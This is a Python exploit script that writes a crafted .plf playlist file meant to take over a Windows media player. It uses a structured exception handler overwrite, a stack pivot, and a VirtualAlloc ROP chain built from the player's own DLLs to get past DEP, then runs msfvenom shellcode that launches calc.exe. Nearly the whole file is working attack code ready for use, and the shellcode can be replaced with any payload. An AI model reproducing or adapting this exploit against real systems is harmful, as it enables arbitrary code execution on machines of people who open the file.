#!/usr/bin/env python
import sys, struct

# Shellcode
# msfvenom -p windows/exec -a x86 --platform windows -b '\x00\x0a\x0d\x1a\x2f\x3a\x5c' cmd=calc.exe -v shellcode -f python
# Size 220 bytes
shellcode =  ""
shellcode += "\xbb\x29\xf9\x09\xf4\xdb\xd4\xd9\x74\x24\xf4\x5f"
shellcode += "\x2b\xc9\xb1\x31\x31\x5f\x13\x83\xc7\x04\x03\x5f"
shellcode += "\x26\x1b\xfc\x08\xd0\x59\xff\xf0\x20\x3e\x89\x14"
shellcode += "\x11\x7e\xed\x5d\x01\x4e\x65\x33\xad\x25\x2b\xa0"
shellcode += "\x26\x4b\xe4\xc7\x8f\xe6\xd2\xe6\x10\x5a\x26\x68"
shellcode += "\x92\xa1\x7b\x4a\xab\x69\x8e\x8b\xec\x94\x63\xd9"
shellcode += "\xa5\xd3\xd6\xce\xc2\xae\xea\x65\x98\x3f\x6b\x99"
shellcode += "\x68\x41\x5a\x0c\xe3\x18\x7c\xae\x20\x11\x35\xa8"
shellcode += "\x25\x1c\x8f\x43\x9d\xea\x0e\x82\xec\x13\xbc\xeb"
shellcode += "\xc1\xe1\xbc\x2c\xe5\x19\xcb\x44\x16\xa7\xcc\x92"
shellcode += "\x65\x73\x58\x01\xcd\xf0\xfa\xed\xec\xd5\x9d\x66"
shellcode += "\xe2\x92\xea\x21\xe6\x25\x3e\x5a\x12\xad\xc1\x8d"
shellcode += "\x93\xf5\xe5\x09\xf8\xae\x84\x08\xa4\x01\xb8\x4b"
shellcode += "\x07\xfd\x1c\x07\xa5\xea\x2c\x4a\xa3\xed\xa3\xf0"
shellcode += "\x81\xee\xbb\xfa\xb5\x86\x8a\x71\x5a\xd0\x12\x50"
shellcode += "\x1f\x2e\x59\xf9\x09\xa7\x04\x6b\x08\xaa\xb6\x41"
shellcode += "\x4e\xd3\x34\x60\x2e\x20\x24\x01\x2b\x6c\xe2\xf9"
shellcode += "\x41\xfd\x87\xfd\xf6\xfe\x8d\x9d\x99\x6c\x4d\x4c"
shellcode += "\x3c\x15\xf4\x90"

# Badbytes: 0x00 0x0a 0x0d 0x1a 0x2f 0x3a 0x5c
goodbytes = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23"
"\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45"
"\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66"
"\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86"
"\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6"
"\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6"
"\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6"
"\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
        )

# ROP chain
# VirtualAlloc() method
def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
    # ESI - PTR to VirtualAlloc()
      0x6162e8cc,  # POP EAX # RETN [EPG.dll] 
      0x64041804,  # RETN (ROP NOP) [MediaPlayerCtrl.dll]
      0x603662fc,  # ptr to &VirtualAlloc() [IAT Configuration.dll]
      0x616306ed,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [EPG.dll] 
      0x616385d8,  # XCHG EAX,ESI # RETN 0x00 [EPG.dll] 
    # EBP - RET address ESP
      0x616331b5,  # POP EBP # RETN [EPG.dll] 
      0x6037927b,  # & jmp esp [Configuration.dll]
    # EBX - 0x1
      0x616310e8,  # POP EAX # RETN [EPG.dll] 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x61627d9c,  # NEG EAX # RETN [EPG.dll] 
      0x6410b090,  # XCHG EAX,EBX # RETN [NetReg.dll] 
    # EDX - 0x1000
      0x61640e32,  # POP EAX # RETN [EPG.dll] 
      0xa7fea59c,  # put delta into eax (-> put 0x00001000 into edx)
      0x6404bc01,  # ADD EAX,58016A64 # RETN 0x0C [MediaPlayerCtrl.dll] 
      0x6037b6cc,  # XCHG EAX,EDX # RETN [Configuration.dll] 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
    # ECX - 0x40
      0x60348de9,  # POP EAX # RETN [Configuration.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x6404a7d3,  # NEG EAX # RETN [MediaPlayerCtrl.dll] 
      0x6036aca8,  # XCHG EAX,ECX # RETN [Configuration.dll] 
    # EDI
      0x6033e7b6,  # POP EDI # RETN [Configuration.dll] 
      0x64041804,  # RETN (ROP NOP) [MediaPlayerCtrl.dll]
    # EAX - NOP
      0x61640e32,  # POP EAX # RETN [EPG.dll] 
      0x90909090,  # nop
    # PUSHAD
      0x6031ff35,  # PUSHAD # RETN [Configuration.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

# Maximum length
maxlen = 8000

# Crashes
crash_nseh = 868
crash_seh = crash_nseh + 4

# Offset of suffix after stackpivot 
sp_suffix = 248

# Constructing payload
prefix = "A" * crash_seh
seh = struct.pack("<L", 0x61623880)                     # ADD ESP,84C # RETN 0x04    ** [EPG.dll] **
nop = "\x90" * 32
ret_nop = struct.pack("<L", 0x6165c191) * 4                 # RET   ** [EPG.dll] ** 
suffix = "B" * sp_suffix
suffix += rop_chain
suffix += nop
suffix += shellcode
suffix += "C" * (maxlen - len(prefix + seh + suffix))

# Crafting payload
payload = prefix + seh + suffix

try:
	file = open("hodor_dep_aslr.plf","wb")
	file.write(payload)
	file.close()
        print "[+] File created successfully with length: " + str(len(payload))
except:
	print "[!] Error creating file!"
	sys.exit(0)
